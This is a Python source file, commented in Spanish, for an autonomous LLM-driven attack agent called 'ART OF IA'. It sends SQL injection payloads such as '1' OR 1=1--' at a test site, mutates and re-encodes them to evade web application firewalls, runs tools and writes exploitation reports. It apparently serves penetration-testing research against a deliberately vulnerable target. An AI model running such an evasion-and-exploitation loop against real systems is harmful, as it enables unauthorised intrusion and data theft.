import os
import asyncio
import json
from datetime import datetime
from typing import TypedDict, List, Dict, Any, Union
from langgraph.graph import StateGraph, END

# Core Framework
from dual_llm_pattern import PrivilegedLLM, QuarantineLLM, SymbolicController
from reflector import Reflector
from polymorphic_bridge import poly_bridge  # Integración del Puente Polimórfico

# Módulos de soporte
try:
    from mutators import arsenal 
    from planner import Planner
    from sniper import Sniper
except ImportError as e:
    print(f"[!] Warning: Módulos auxiliares no encontrados ({e}). Usando fallbacks.")

# --- UTILIDAD DE REPORTING (Fase 4) ---
class ArtOfIA_Reporter:
    """Genera la evidencia técnica de la vulnerabilidad encontrada."""
    @staticmethod
    def generate_poc_report(state: 'AgentState'):
        report = {
            "timestamp": datetime.now().isoformat(),
            "target": state.get("target_url"),
            "vulnerability": state.get("vuln_type"),
            "final_payload": state.get("current_payload"),
            "polymorphic_chain": state.get("polymorphic_chain"),
            "attack_history": state.get("failed_attempts_summary", []),
            "status": "EXPLOITED" if state.get("status") == "success" else "PARTIAL_SUCCESS",
            "evidence": state.get("exfiltrated_data", "N/A")
        }
        
        filename = f"poc_{state.get('vuln_type', 'vuln')}_{int(datetime.now().timestamp())}.json"
        with open(filename, "w") as f:
            json.dump(report, f, indent=4)
        
        return filename

# --- ESQUEMA DE ESTADO "BEAST MODE 4.0" ---
class AgentState(TypedDict):
    # Misión y Target
    mission: str
    target_url: str
    
    # Payload y Vulnerabilidad
    current_payload: str
    vuln_type: str  # 'SQLI', 'LFI', 'XSS'
    polymorphic_chain: List[str] 
    
    # Control de Flujo
    iteration: int
    status: str # 'starting', 'success', 'blocked', 'failed', 'analyzed'
    last_action: str # 'MUTATE', 'RUN_TOOL', 'POLYMORPH'
    
    # Datos de Análisis y Exfiltración
    exfiltrated_data: str
    tool_output: str 
    last_tool: str 
    last_response_metadata: Dict[str, Any] 
    waf_metadata: Dict[str, Any] 
    failed_attempts_summary: List[Dict[str, Any]] 
    
    # Mapa Simbólico (Aislamiento Zero-Trust)
    symbolic_map: List[str]

class ArtOfIAOrchestrator:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.max_iterations = 25
        
        # 1. Controladores y LLMs
        self.controller = SymbolicController()
        self.quarantine = QuarantineLLM(self.controller)
        self.brain = PrivilegedLLM(self.controller)
        
        # 2. Reflector Híbrido (Análisis HTTP + Stdout)
        self.reflector = Reflector(target_url=target_url)
        
        # Soporte
        try:
            self.planner = Planner() 
            self.sniper = Sniper()
        except:
            self.planner = None
            self.sniper = None

    async def planner_node(self, state: AgentState):
        """Coordinador inicial: Define el vector de ataque."""
        print(f"\n[*] [PLANNER] Iteración {state.get('iteration', 0)}. Trazando ruta de ataque...")
        
        if self.planner:
            result = await self.planner.execute(state)
        else:
            result = {"current_payload": "1' OR 1=1--", "vuln_type": "SQLI"}
            
        return {
            **result, 
            "iteration": state.get("iteration", 0) + 1,
            "status": "starting"
        }

    async def quarantine_node(self, state: AgentState):
        """L1: Aislamiento y Simbolización de la respuesta hostil."""
        print("[*] [QUARANTINE] Ejecutando aislamiento y sanitización L1...")
        
        # El Reflector guarda el contenido en last_response_metadata
        raw_response = state.get("last_response_metadata", {}).get("last_content", "")
        if not raw_response:
            raw_response = f"Target URL: {state['target_url']}"

        symbolic_findings = await self.quarantine.parse_and_symbolize(raw_response)
        
        return {
            "waf_metadata": {
                "block_detected": symbolic_findings.get("waf_block_detected", False),
                "status_code": symbolic_findings.get("status_code"),
                "block_type": state.get("last_response_metadata", {}).get("block_type", "Generic"),
                "detected_tech": symbolic_findings.get("technologies", [])
            },
            "symbolic_map": symbolic_findings.get("parameters", []),
            "status": "analyzed"
        }

    async def strategy_node(self, state: AgentState):
        """
        Cerebro L2: Decide entre MUTATE (quirúrgico), RUN_TOOL (profesional) o POLYMORPH (evasión).
        """
        print(f"[*] [STRATEGY] Analizando vector {state.get('vuln_type')}...")
        
        symbolic_context = {
            "parameters": state.get("symbolic_map", []),
            "waf_block_detected": state.get("waf_metadata", {}).get("block_detected", False),
            "block_type": state.get("waf_metadata", {}).get("block_type"),
            "status_code": state.get("waf_metadata", {}).get("status_code")
        }
        
        decision = await self.brain.decide_action(symbolic_context)
        action = decision.get("action")

        if action == "MUTATE":
            print(f"[+] [STRATEGY] Decisión: MUTATE.")
            strategy_name = await self.brain.decide_strategy(state)
            try:
                mutated_payload = arsenal.mutate(
                    payload=state["current_payload"], 
                    vuln_type=state.get("vuln_type", "SQLI"), 
                    strategy=strategy_name
                )
                return {
                    "current_payload": mutated_payload,
                    "last_action": "MUTATE",
                    "status": "ready_to_test"
                }
            except Exception as e:
                return {"last_action": "MUTATE", "status": "ready_to_test"}
        
        elif action == "RUN_TOOL":
            print(f"[+] [STRATEGY] Decisión: RUN_TOOL ({decision.get('tool')}).")
            return {
                "last_action": "RUN_TOOL",
                "last_tool": decision.get("tool"),
                "current_payload": decision.get("arguments"), 
                "status": "ready_for_tool"
            }
        
        elif action == "POLYMORPH":
            print(f"[+] [STRATEGY] Decisión: POLYMORPH. Diseñando cadena de evasión...")
            chain = decision.get("chain", ["URL_ENCODE"]) 
            return {
                "polymorphic_chain": chain,
                "last_action": "POLYMORPH",
                "status": "ready_for_poly"
            }
        
        return {"status": "failed"}

    async def polymorph_node(self, state: AgentState):
        """Aplica las transformaciones de codificación al payload actual."""
        print(f"[*] [POLYMORPH] Aplicando cadena: {state.get('polymorphic_chain')}...")
        
        payload = state.get("current_payload", "")
        chain = state.get("polymorphic_chain", [])
        encoded_payload = poly_bridge.apply_chain(payload, chain)
        
        return {
            "current_payload": encoded_payload,
            "status": "ready_to_test"
        }

    async def tool_executor_node(self, state: AgentState):
        """Ejecución en sandbox (ai-worker)."""
        print(f"[*] [EXECUTOR] Lanzando {state.get('last_tool')}...")
        
        decision = {
            "action": "RUN_TOOL", 
            "tool": state.get("last_tool"), 
            "arguments": state.get("current_payload")
        }
        
        result = await self.brain.secure_tool_execution(decision)
        
        if result["status"] == "success":
            return {"tool_output": result.get("output", ""), "status": "tool_completed"}
        else:
            return {"status": "failed", "tool_output": result.get("message")}

    async def reflector_node(self, state: AgentState):
        """Análisis de respuesta y validación de éxito."""
        return await self.reflector.execute(state)

    async def report_node(self, state: AgentState):
        """HARDENING FASE 4: Genera el informe técnico final y la PoC."""
        print("[*] [REPORTING] Generando informe de explotación y evidencia técnica...")
        filename = ArtOfIA_Reporter.generate_poc_report(state)
        print(f"[+] PoC generada exitosamente en: {filename}")
        return {**state, "status": "reported"}

    def build_graph(self):
        """Construcción del Grafo LangGraph (Beast Mode 4.0)."""
        workflow = StateGraph(AgentState)
        
        # Añadir nodos
        workflow.add_node("planner", self.planner_node)
        workflow.add_node("quarantine", self.quarantine_node)
        workflow.add_node("strategy", self.strategy_node)
        workflow.add_node("polymorph", self.polymorph_node)
        workflow.add_node("tool_executor", self.tool_executor_node)
        workflow.add_node("reflector", self.reflector_node)
        workflow.add_node("report_gen", self.report_node)

        # --- FLUJO DE EJECUCIÓN ---
        workflow.set_entry_point("planner")
        workflow.add_edge("planner", "reflector")
        
        # Reflector -> Reporte (si éxito) o Quarantine (si falla/bloqueo)
        workflow.add_conditional_edges(
            "reflector",
            lambda x: x["status"],
            {
                "success": "report_gen",
                "blocked": "quarantine",
                "failed": "quarantine",
                "tool_completed": "quarantine"
            }
        )
        
        workflow.add_edge("report_gen", END)
        workflow.add_edge("quarantine", "strategy")
        
        # Strategy -> Acciones Diversas
        workflow.add_conditional_edges(
            "strategy",
            lambda x: x["last_action"],
            {
                "MUTATE": "reflector",
                "RUN_TOOL": "tool_executor",
                "POLYMORPH": "polymorph"
            }
        )
        
        workflow.add_edge("tool_executor", "reflector")
        workflow.add_edge("polymorph", "reflector")

        return workflow.compile()

async def main():
    target = "http://testphp.vulnweb.com" 
    orchestrator = ArtOfIAOrchestrator(target_url=target)
    app = orchestrator.build_graph()
    
    print("\n" + "="*60)
    print(" ART OF IA v4.0 - BEAST MODE: HARDENING PHASE ")
    print(" [Strategic Brain] | [Polymorphic Bridge] | [Reporting PoC] ")
    print("="*60 + "\n")
    
    initial_state = {
        "mission": "Detectar y explotar vulnerabilidades críticas",
        "target_url": target,
        "current_payload": "1' OR 1=1--", 
        "vuln_type": "SQLI", 
        "polymorphic_chain": [],
        "exfiltrated_data": "",
        "iteration": 0,
        "status": "starting",
        "last_action": "MUTATE",
        "failed_attempts_summary": [],
        "last_response_metadata": {},
        "waf_metadata": {},
        "symbolic_map": [],
        "tool_output": ""
    }
    
    try:
        async for output in app.astream(initial_state):
            pass
    except Exception as e:
        print(f"[!] Error en el ciclo de ejecución: {e}")

if __name__ == "__main__":
    asyncio.run(main())
